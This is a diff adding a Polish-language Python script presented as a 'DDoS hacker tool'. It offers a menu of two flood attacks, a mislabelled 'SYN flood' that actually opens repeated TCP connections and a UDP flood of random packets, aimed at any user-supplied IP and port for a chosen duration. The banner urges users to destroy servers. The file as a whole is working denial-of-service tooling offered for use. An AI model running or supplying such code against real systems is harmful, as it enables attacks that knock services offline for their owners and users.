@@ -1,0 +1,67 @@
+import socket
+import random
+import threading
+import time
+
+# Funkcja do przeprowadzania ataku DDoS typu SYN Flood
+def syn_flood(target_ip, target_port, duration):
+    duration = float(duration)
+    end_time = time.time() + duration
+    while True:
+        if time.time() > end_time:
+            break
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target_ip, target_port))
+        s.sendto("GET / HTTP/1.1\r\n".encode(), (target_ip, target_port))
+        s.close()
+
+# Funkcja do przeprowadzania ataku DDoS typu UDP Flood
+def udp_flood(target_ip, target_port, duration):
+    duration = float(duration)
+    end_time = time.time() + duration
+    while True:
+        if time.time() > end_time:
+            break
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        bytes = random._urandom(1024)
+        s.sendto(bytes, (target_ip, target_port))
+
+# Funkcja wyświetlająca menu
+def display_menu():
+    print("""
+       ____  _  __ _____ ___  _   _ 
+      / ___|| |/ /|  ___|_ _|| \ | |
+      \___ \| ' / | |_   | | |  \| |
+       ___) | . \ |  _|  | | | |\  |
+      |____/|_|\_\|_|   |___||_| \_|
+                                   
+    """)
+    print("Witaj w hakerskim narzędziu DDoS! DC:_250ms_")
+    print("Przeprowadź atak, niszcz serwery i baw się dobrze.\n")
+    print("Wybierz typ ataku DDoS:")
+    print("1. Atak SYN Flood")
+    print("2. Atak UDP Flood")
+    print("3. Wyjdź")
+
+# Główna pętla programu
+while True:
+    display_menu()
+    choice = input("Wybierz opcję: ")
+    if choice == "1":
+        target_ip = input("Podaj adres IP celu: ")
+        target_port = int(input("Podaj port celu: "))
+        duration = input("Podaj czas trwania ataku (w sekundach): ")
+        thread = threading.Thread(target=syn_flood, args=(target_ip, target_port, duration))
+        thread.start()
+        thread.join()  # Czekaj na zakończenie ataku przed ponownym wyświetleniem menu
+    elif choice == "2":
+        target_ip = input("Podaj adres IP celu: ")
+        target_port = int(input("Podaj port celu: "))
+        duration = input("Podaj czas trwania ataku (w sekundach): ")
+        thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration))
+        thread.start()
+        thread.join()  # Czekaj na zakończenie ataku przed ponownym wyświetleniem menu
+    elif choice == "3":
+        break
+    else:
+        print("Nieprawidłowa opcja!")
